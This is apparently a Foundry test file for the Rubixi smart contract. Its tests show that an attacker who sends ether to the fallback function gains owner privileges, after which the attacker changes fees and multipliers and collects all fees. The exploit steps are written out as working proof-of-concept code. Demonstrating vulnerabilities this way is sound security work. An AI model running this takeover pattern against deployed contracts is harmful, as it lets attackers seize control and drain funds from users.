// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/rubixi.sol";

contract RubixiTest is Test {
    Rubixi rubixi;
    address owner = address(0x1);
    address attacker = address(0x2);

    function setUp() public {
        vm.prank(owner);
        rubixi = new Rubixi();
    }

    function testAccessControlVulnerability() public {
        console2.log("[TEST] testAccessControlVulnerability");
        console2.log("--- BEFORE Trigger: Owner function call ---");
        vm.prank(owner);
        rubixi.changeFeePercentage(5); 
        console2.log("Original owner successfully called changeFeePercentage");

        console2.log("--- ATTACK Trigger: Attacker sends 1 ether ---");
        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        (bool success,) = address(rubixi).call{value: 1 ether}("");
        require(success, "Call failed");
        console2.log("Attacker sent 1 ether to contract");

        console2.log("--- AFTER Trigger: Verify privilege escalation ---");
        vm.prank(attacker);
        rubixi.changeFeePercentage(10);
        console2.log("Attacker successfully called owner-only function");

        console2.log("Vulnerability Exists: Attacker successfully bypassed access control");
    }

    function testReinitializationAttack() public {
        console2.log("[TEST] testReinitializationAttack");
        address attacker1 = address(0x3);
        address attacker2 = address(0x4);

        // First attacker attack
        console2.log("--- BEFORE First Attack ---");
        console2.log("Original owner privileges intact");
        
        console2.log("--- ATTACK Trigger 1 ---");
        vm.deal(attacker1, 1 ether);
        vm.prank(attacker1);
        (bool success1,) = address(rubixi).call{value: 1 ether}("");
        require(success1, "Call failed");
        console2.log("Attacker1 sent 1 ether");

        console2.log("--- AFTER First Attack ---");
        vm.prank(attacker1);
        rubixi.changeMultiplier(200);
        console2.log("Attacker1 successfully called owner function");

        // Second attacker attack
        console2.log("--- BEFORE Second Attack ---");
        console2.log("System state after first attack");
        
        console2.log("--- ATTACK Trigger 2 ---");
        vm.deal(attacker2, 1 ether);
        vm.prank(attacker2);
        (bool success2,) = address(rubixi).call{value: 1 ether}("");
        require(success2, "Call failed");
        console2.log("Attacker2 sent 1 ether");

        console2.log("--- AFTER Second Attack ---");
        vm.prank(attacker2);
        rubixi.collectAllFees();
        console2.log("Attacker2 successfully called owner function");
        
        console2.log("Vulnerability Exists: Multiple attackers became owners");
    }

    function testFallbackFunction() public {
        console2.log("[TEST] testFallbackFunction - No access control test");
        // Existing implementation unchanged
        vm.deal(attacker, 0.5 ether);
        vm.prank(attacker);
        (bool successSmall,) = address(rubixi).call{value: 0.5 ether}("");
        require(successSmall, "Small call failed");

        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        (bool successExact,) = address(rubixi).call{value: 1 ether}("");
        require(successExact, "Exact call failed");

        vm.deal(attacker, 50 ether);
        vm.prank(attacker);
        (bool successLarge,) = address(rubixi).call{value: 50 ether}("");
        require(successLarge, "Large call failed");
        
        console2.log("Fallback calls completed - No access control verified here");
    }
}